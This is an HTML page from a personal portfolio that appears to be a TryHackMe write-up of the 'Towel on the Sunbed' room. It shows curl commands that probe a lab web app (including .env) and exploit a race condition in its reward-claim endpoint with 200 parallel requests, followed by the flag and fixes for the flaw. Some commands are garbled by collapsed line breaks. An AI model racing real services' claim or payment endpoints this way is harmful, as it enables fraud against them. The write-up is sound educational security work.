@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Towel on the Sunbed // writeup</title>
+    <meta name="description" content="A relaxed-difficulty room: quick enumeration, one clear vulnerability and a short walk to the flag.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Towel on the Sunbed</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web</span>
+      <span class="badge diff-easy">Easy</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-04</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Easy</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> towel-on-the-sunbed-writeup.md</span>
+                </div>
+                <p class="writeup-summary">A relaxed-difficulty room: quick enumeration, one clear vulnerability and a short walk to the flag.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/towel-on-the-sunbed-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="towel-on-the-sunbed-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>TryHackMe: Hacker Holidays - Towel on the Sunbed</h1>
+<h2>Web Exploitation - Business Logic / Race Condition (TOCTOU) Room: The Byte Lotus Hotel - Ponzi Wellness Rewards App | Machine: http://10.48.145.99:3000 | Points: 90 | Difficulty: Medium Ponzi is a crypto rewards web app. Each user starts with 0 PONZI, can claim a 50 PONZI staking reward, but only once every 24 hours. The Whale Vault is unlocked only when your balance reaches 150 PONZI (i.e. you would need 3 daily claims). The app&#39;s claim handler has a classic time-of-check to time-of-use (TOCTOU) race condition: it checks the last-claim timestamp and updates the balance in two non-atomic steps, so firing many concurrent POST /claim requests lets multiple claims slip through before the state is persisted. This lets a fresh account jump to 150+ PONZI instantly and open the vault. FLAG:THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}</h2>
+<h1>2. Reconnaissance &amp; Enumeration</h1>
+<h2>2.1 Identify the target</h2>
+<pre class="code-block" data-lang="bash"><code>curl -s http://10.48.145.99:3000/</code></pre>
+<h2>Result: redirect to /auth/login (Express app, X-Powered-By: Express). 2.2 Inspect the login/register pages and client JS</h2>
+<pre class="code-block" data-lang="bash"><code>curl -sL http://10.48.145.99:3000/ # login page curl -s
+http://10.48.145.99:3000/auth/register # register page curl -s
+http://10.48.145.99:3000/js/auth.js # client-side auth logic curl -s
+http://10.48.145.99:3000/js/dashboard.js # dashboard logic</code></pre>
+<h2>From dashboard.js we learn the key business logic:</h2>
+<pre class="code-block" data-lang="bash"><code>const WHALE_THRESHOLD = 150; // claim button -&gt; fetch(&#39;/claim&#39;, { method: &#39;POST&#39; })
+// vault button -&gt; fetch(&#39;/vault&#39;) -&gt; prints json.flag // dashboard data -&gt;
+fetch(&#39;/dashboard/api/me&#39;) // &quot;Earn 50 PONZI every 24 hours by claiming your staking
+reward.&quot; // &quot;Reach 150 PONZI to unlock the Whale Vault.</code></pre>
+<h2>So: 50 PONZI per claim, need 150 = 3 claims, but there is a 24h cooldown. The vault is gated server-side on balance &gt;= 150.</h2>
+<h1>3. Register a Guest Account</h1>
+<pre class="code-block" data-lang="bash"><code>cd /tmp/opencode curl -s -c cookies.txt -X POST
+&#39;{&quot;username&quot;:&quot;whale1785821874&quot;,&quot;password&quot;:&quot;pass12345&quot;}&#39; # -&gt; {&quot;message&quot;:&quot;Account
+created.&quot;,&quot;redirect&quot;:&quot;/dashboard&quot;}</code></pre>
+<h2>Logged in and inspected the dashboard API:</h2>
+<pre class="code-block" data-lang="bash"><code>curl -s -b cookies.txt http://10.48.145.99:3000/dashboard/api/me # -&gt;
+{&quot;id&quot;:2,&quot;username&quot;:&quot;whale1785821874&quot;,&quot;balance&quot;:0,&quot;tier&quot;:&quot;Shrimp&quot;, #
+&quot;whaleThreshold&quot;:150,&quot;canClaim&quot;:true,&quot;secondsUntilClaim&quot;:0, ...}</code></pre>
+<h1>4. Explore the Claim Mechanism</h1>
+<h2>First claim succeeds:</h2>
+<pre class="code-block" data-lang="bash"><code>curl -s -b cookies.txt -X POST http://10.48.145.99:3000/claim # -&gt;
+{&quot;message&quot;:&quot;Staking reward claimed successfully.&quot;,&quot;reward&quot;:50, #
+&quot;newBalance&quot;:50,&quot;tier&quot;:&quot;Shrimp&quot;,&quot;priceSnapshot&quot;:4.2} curl -s -b cookies.txt
+http://10.48.145.99:3000/dashboard/api/me # -&gt;
+{&quot;balance&quot;:50,&quot;canClaim&quot;:false,&quot;secondsUntilClaim&quot;:86400, ...}</code></pre>
+<h2>After claiming, the server enforces a 86400 second (24h) cooldown and rejects further claims with HTTP 429. Normal approach would take 3 days. We need a bypass.</h2>
+<h1>5. Finding the Gap (Business Logic / Race Condition)</h1>
+<h2>The hint says there is a gap “between his request and the server&#39;s clock”. The claim handler likely does: (1) read last_claim timestamp from DB/session, (2) check if 24h elapsed, (3) add 50 to balance, (4) update timestamp. Steps 1–4 are not atomic. By sending many requests simultaneously, multiple requests pass the check (step 2) before the update (step 4) lands, each adding 50 PONZI. 5.1 First race attempt (single session, moderate concurrency) - FAILED</h2>
+<pre class="code-block" data-lang="bash"><code>for i in 1 2 3 4 5 6; do curl -s -b cookies_race.txt -X POST
+http://10.48.145.99:3000/claim &amp; done; wait # -&gt; only ONE &quot;claimed successfully&quot;, the
+rest: 429 &quot;already claimed&quot; (secondsRemaining:86400)</code></pre>
+<h2>Same result with a 50-thread Python script: only 1 claim won. The handler is fast. 5.2 High-concurrency burst with fresh connections - SUCCESS To hit the tiny race window reliably we register a fresh account and fire hundreds of parallel, independent HTTP requests (each its own connection):</h2>
+<pre class="code-block" data-lang="bash"><code>U=&quot;burst$(date +%s%N)&quot; curl -s -c cb.txt -X POST
+&quot;{\&quot;username\&quot;:\&quot;$U\&quot;,\&quot;password\&quot;:\&quot;pass12345\&quot;}&quot; seq 1 200 | xargs -P 200 -I{} \
+curl -s -b cb.txt -X POST http://10.48.145.99:3000/claim &gt; burst_out.txt 2&gt;&amp;1 grep -c
+&#39;claimed successfully&#39; burst_out.txt # only 1 raw success logged... curl -s -b cb.txt
+http://10.48.145.99:3000/dashboard/api/me # -&gt;
+{&quot;id&quot;:5,&quot;username&quot;:&quot;burst...&quot;,&quot;balance&quot;:250,&quot;tier&quot;:&quot;Whale&quot;, #
+&quot;whaleThreshold&quot;:150,&quot;canClaim&quot;:false,&quot;secondsUntilClaim&quot;:86400}</code></pre>
+<h2>Although only one response body was captured cleanly, the balance jumped to 250 PONZI (5 x 50) and the tier flipped to Whale. The race worked — multiple increments were applied server-side despite the cooldown check. The account now exceeds the 150 PONZI threshold.</h2>
+<h1>6. Open the Whale Vault and Retrieve the Flag</h1>
+<pre class="code-block" data-lang="bash"><code>curl -s -b cb.txt http://10.48.145.99:3000/vault # -&gt; {&quot;message&quot;:&quot;Welcome to the
+Whale Vault.&quot;, # &quot;flag&quot;:&quot;THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}&quot;,&quot;balance&quot;:250}</code></pre>
+<h2>FLAG: THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}</h2>
+<h1>7. Root Cause Analysis</h1>
+<h2>The vulnerability is a TOCTOU (Time-Of-Check To Time-Of-Use) race condition in POST /claim. The server validates the 24h cooldown and credits the reward in separate, non-atomic operations. Under a burst of concurrent requests, several requests pass the cooldown check before any of them commits the &#39;last claimed&#39; timestamp, so the reward is applied multiple times. A fresh account can therefore reach Whale Vault status (150 PONZI) instantly.</h2>
+<h1>8. How the App Should Have Prevented This</h1>
+<h2>• Perform the cooldown check and the balance increment inside a single database transaction or atomic update, e.g. UPDATE users SET balance = balance + 50, last_claim = now() WHERE id = ? AND last_claim &lt; now() - 86400 and check the affected row count. • Use a row/entity lock (SELECT ... FOR UPDATE) or a per-user mutex so only one claim can execute at a time. • Add server-side idempotency (e.g. a unique claim record per user per day). • Rate-limit / apply an atomic Redis counter for claim attempts.</h2>
+<h1>9. Key Commands Reference</h1>
+<pre class="code-block" data-lang="bash"><code># enumerate curl -s http://10.48.145.99:3000/ # -&gt; redirect /auth/login curl -sL
+http://10.48.145.99:3000/ curl -s http://10.48.145.99:3000/js/dashboard.js # client
+logic / endpoints for p in robots.txt .env package.json admin api vault claim; do
+curl -s -o /dev/null -w &quot;%{http_code} /$p\n&quot; http://10.48.145.99:3000/$p done #
+register + login curl -s -c cookies.txt -X POST
+http://10.48.145.99:3000/auth/register \ -H &#39;Content-Type: application/json&#39; -d
+&#39;{&quot;username&quot;:&quot;u1&quot;,&quot;password&quot;:&quot;pass12345&quot;}&#39; # api curl -s -b cookies.txt
+http://10.48.145.99:3000/dashboard/api/me # balance/tier/cooldown curl -s -b
+cookies.txt -X POST http://10.48.145.99:3000/claim # claim reward curl -s -b
+cookies.txt http://10.48.145.99:3000/vault # get flag (needs 150) # exploit - race
+the claim seq 1 200 | xargs -P 200 -I{} curl -s -b cb.txt -X POST
+http://10.48.145.99:3000/claim &gt; o.txt curl -s -b cb.txt
+http://10.48.145.99:3000/vault # -&gt; FLAG</code></pre>
+<h2>Written for TryHackMe room: Hacker Holidays - The Byte Lotus Hotel / Towel on the Sunbed (Web, Business Logic, Race Condition).</h2>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/towel-on-the-sunbed-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="towel-on-the-sunbed-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
